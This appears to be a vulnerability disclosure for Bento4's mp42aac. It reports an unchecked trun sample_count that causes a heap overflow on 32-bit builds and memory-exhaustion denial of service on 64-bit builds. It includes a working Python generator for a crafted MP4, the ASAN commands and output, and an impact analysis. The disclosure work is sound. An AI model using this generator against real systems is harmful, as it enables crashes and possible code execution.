## Bug0: Integer overflow in AP4_Array::EnsureCapacity leading to heap buffer overflow in AP4_FragmentSampleTable::AddTrun

In `AP4_FragmentSampleTable::AddTrun` (Ap4FragmentSampleTable.cpp) and `AP4_Array<T>::EnsureCapacity` (Ap4Array.h), an attacker-controlled `sample_count` field of `0x20000000` from a crafted trun atom is passed directly to `EnsureCapacity` without any upper-bound validation, causing integer overflow in the allocation size on 32-bit builds (heap buffer overflow) and uncontrolled multi-gigabyte memory exhaustion on 64-bit builds (denial of service via RSS limit or std::bad_alloc abort).

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(box_type, payload):
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type.encode("ascii") + payload

def fullbox(box_type, version, flags, payload):
    fb_payload = struct.pack(">B", version) + struct.pack(">I", flags)[1:] + payload
    return box(box_type, fb_payload)

def build_ftyp():
    payload = b"mp42"
    payload += struct.pack(">I", 0)
    payload += b"mp42"
    return box("ftyp", payload)

def build_mvhd():
    payload = struct.pack(">IIII", 0, 0, 1000, 0)
    payload += struct.pack(">I", 0x00010000)
    payload += struct.pack(">H", 0x0100)
    payload += b"\x00" * 10
    payload += struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    payload += b"\x00" * 24
    payload += struct.pack(">I", 2)
    return fullbox("mvhd", 0, 0, payload)

def build_tkhd():
    payload = struct.pack(">IIIII", 0, 0, 1, 0, 0)
    payload += b"\x00" * 8
    payload += struct.pack(">hhhh", 0, 0, 0, 0)
    payload += struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    payload += struct.pack(">II", 0, 0)
    return fullbox("tkhd", 0, 0x000003, payload)

def build_mdhd():
    payload = struct.pack(">IIII", 0, 0, 44100, 0)
    payload += struct.pack(">HH", 0x55C4, 0)
    return fullbox("mdhd", 0, 0, payload)

def build_hdlr():
    payload = struct.pack(">I", 0)
    payload += b"soun"
    payload += b"\x00" * 12
    payload += b"\x00"
    return fullbox("hdlr", 0, 0, payload)

def build_smhd():
    payload = struct.pack(">HH", 0, 0)
    return fullbox("smhd", 0, 0, payload)

def build_dinf():
    url_payload = struct.pack(">B", 0) + b"\x00\x00\x01"
    url_entry = box("url ", url_payload)
    dref_payload = struct.pack(">I", 1) + url_entry
    dref = fullbox("dref", 0, 0, dref_payload)
    return box("dinf", dref)

def build_stbl():
    stsd = fullbox("stsd", 0, 0, struct.pack(">I", 0))
    stts = fullbox("stts", 0, 0, struct.pack(">I", 0))
    stsc = fullbox("stsc", 0, 0, struct.pack(">I", 0))
    stsz = fullbox("stsz", 0, 0, struct.pack(">II", 0, 0))
    stco = fullbox("stco", 0, 0, struct.pack(">I", 0))
    return box("stbl", stsd + stts + stsc + stsz + stco)

def build_minf():
    return box("minf", build_smhd() + build_dinf() + build_stbl())

def build_mdia():
    return box("mdia", build_mdhd() + build_hdlr() + build_minf())

def build_trak():
    return box("trak", build_tkhd() + build_mdia())

def build_moov():
    return box("moov", build_mvhd() + build_trak())

def build_mfhd():
    return fullbox("mfhd", 0, 0, struct.pack(">I", 1))

def build_tfhd():
    return fullbox("tfhd", 0, 0x000000, struct.pack(">I", 1))

def build_trun():
    SAMPLE_COUNT = 0x20000000
    payload = struct.pack(">I", SAMPLE_COUNT)
    payload += struct.pack(">i", 8)
    return fullbox("trun", 0, 0x000001, payload)

def build_traf():
    return box("traf", build_tfhd() + build_trun())

def build_moof():
    return box("moof", build_mfhd() + build_traf())

def build_mdat():
    return box("mdat", b"")

ftyp = build_ftyp()
moov = build_moov()
moof = build_moof()
mdat = build_mdat()
mp4_data = ftyp + moov + moof + mdat

with open("poc_input.mp4", "wb") as f:
    f.write(mp4_data)
print(f"[+] Written {len(mp4_data)} bytes to poc_input.mp4")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** AddressSanitizer: hard rss limit exhausted (512Mb vs 742Mb)
Process aborted with exit code 134 (SIGABRT) after a 537-byte input caused the process RSS to reach 742MB because AP4_Array::EnsureCapacity attempted to allocate 8 GB for 0x20000000 entries of size 16 bytes each.

### Impact

On 32-bit builds, the multiplication `0x20000000 * sizeof(T)` wraps to zero, causing `new T[count]` to allocate zero bytes while `m_AllocatedCount` is set to 0x20000000, and the subsequent construction loop then writes approximately 536 million objects to unallocated heap memory, enabling an attacker to corrupt heap metadata and adjacent allocations toward arbitrary code execution. On 64-bit builds, the allocation size does not overflow so the allocator requests up to 8 GB of memory, which exhausts physical RAM or triggers an uncaught `std::bad_alloc`, crashing the process and constituting a reliable denial of service. Any invocation of mp42aac on an untrusted MP4 file is exposed because the vulnerable path is reached unconditionally during normal fragmented-MP4 parsing with no authentication or privilege required.
